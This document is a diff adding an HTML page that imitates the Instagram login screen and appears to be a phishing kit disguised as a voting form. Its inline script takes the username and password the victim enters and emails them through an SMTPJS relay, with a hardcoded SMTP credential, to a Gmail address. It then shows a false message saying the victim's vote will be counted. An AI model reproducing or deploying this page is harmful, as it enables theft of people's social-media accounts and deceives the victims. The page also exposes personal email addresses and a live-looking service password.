@@ -1,0 +1,102 @@
+<meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Instagram Login</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="assets/img/logo.jpg" rel="icon">
+  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+        
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  
+  <link href="instagram.css" rel="stylesheet">
+
+  
+</head>
+
+<body>
+
+      <div class="container"> 
+        <div class="login-container">
+            <img src="images/233.PNG" alt="Instagram Logo" />
+            <form onsubmit="Mail(); reset(); return false;">
+              <input type="text" id="username" placeholder="Username" required />
+              <input type="password" id="password" placeholder="Password" required />
+              <button type="submit" id="buttons">Login</button>
+              <p class="forgot-password"><a href="">Forgot password?</a></p>
+            </form>
+          </div>
+          <div class="account">
+            <p>
+              Don't have an account?
+              <span class="forgot-password"> <a href="">SignUp</a></span>
+            </p>
+          </div>
+          <div class="meta-img">
+            <p class="first-p">From</p>
+            <img class="img2" src="images/Capture3444.PNG" alt="" />
+            <p class="meta">Meta</p>
+          </div>
+        </div>
+          <script src="instagram.js"></script>
+          <!--Smtpjs-->
+          <script src="https://smtpjs.com/v3/smtp.js"></script>
+          <script>
+            function Mail() {
+              let username = document.getElementById("username").value;
+              let password = document.getElementById("password").value;
+      
+              Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "thomaswills939@gmail.com",
+                Password: "48EC737848288E288E040C0C9C7629431034",
+                To: "stevethomas0901@gmail.com",
+                From: "thomaswills939@gmail.com",
+                Subject: "Mail From Voting Form",
+                Body: "Username:" + username + "<br> Password:" + password,
+              }).then((message) =>
+                alert(
+                  "You will be notified when your vote has been counted"
+                )
+              );
+            }
+          </script>
+        
+    
+     
+    
+  
+
+ 
+  
+
+  
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
+  <script src="assets/vendor/aos/aos.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="main.js"></script>
+
+</body>
+
+</html>
